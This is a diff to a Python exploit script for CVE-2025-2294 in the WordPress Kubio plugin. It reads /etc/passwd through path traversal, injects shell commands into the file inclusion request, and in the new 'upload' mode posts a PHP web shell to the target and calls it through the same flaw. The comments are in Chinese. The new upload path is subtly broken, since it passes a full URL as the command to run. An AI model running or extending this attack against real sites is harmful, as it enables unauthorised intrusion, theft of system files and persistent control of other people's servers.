@@ -54,7 +54,7 @@ def display_result(content):
         print("[-] Exploit failed or file not readable.")
 
 def execute_command_via_lfi(url, command):
-    # 将命令注入到 LFI 请求中
+    # LFI 漏洞触发的 URL，其中通过 LFI 注入了命令执行
     lfi_url = f"{url}/wp-content/plugins/kubio/readme.txt?file=../../../../../../../../etc/passwd;{command}"
     try:
         response = session.get(lfi_url, timeout=10)
@@ -66,6 +66,22 @@ def execute_command_via_lfi(url, command):
             print(f"[-] Command execution failed: {command}")
     except requests.RequestException:
         print("[-] Request failed.")
+
+def upload_shell_and_execute(url, file_path, shell_path):
+    # 假设这里是通过其他途径上传文件到目标服务器
+    try:
+        with open(file_path, 'rb') as file:
+            files = {'file': ('shell.php', file)}
+            response = session.post(f"{url}/upload.php", files=files, timeout=10)
+            if response.status_code == 200:
+                print(f"[+] Shell uploaded to {shell_path}")
+                # 成功上传后，通过 LFI 执行 shell
+                lfi_url = f"{url}/wp-content/plugins/kubio/readme.txt?file={shell_path}"
+                execute_command_via_lfi(url, lfi_url)
+            else:
+                print("[-] File upload failed.")
+    except Exception as e:
+        print(f"[-] Upload failed: {e}")
 
 def exploit(target_url, file_to_read):
     readme = fetch_readme(target_url)
@@ -81,8 +97,10 @@ def main():
     print(banner)
     parser = argparse.ArgumentParser(description="CVE-2025-2294 LFI Command Execution Exploit Script")
     parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., https://example.com)")
-    parser.add_argument("-m", "--mode", required=True, choices=["check", "cmd"], help="Mode to run")
+    parser.add_argument("-m", "--mode", required=True, choices=["check", "cmd", "upload"], help="Mode to run")
     parser.add_argument("-c", "--cmd", help="Command to execute via LFI (e.g., ls -la or id)")
+    parser.add_argument("-f", "--file", help="Path to the file to upload (if mode is upload)")
+    parser.add_argument("-p", "--shellpath", help="Path on the target server where the shell is uploaded (if mode is upload)")
     args = parser.parse_args()
 
     target_url = args.url.rstrip("/")
@@ -100,6 +118,13 @@ def main():
             execute_command_via_lfi(target_url, args.cmd)
         else:
             print("[-] Command argument is required for 'cmd' mode.")
+
+    elif args.mode == "upload":
+        if args.file and args.shellpath:
+            print(f"[*] Uploading shell: {args.file} to {args.shellpath}")
+            upload_shell_and_execute(target_url, args.file, args.shellpath)
+        else:
+            print("[-] File and shell path arguments are required for 'upload' mode.")
 
 if __name__ == "__main__":
     main()
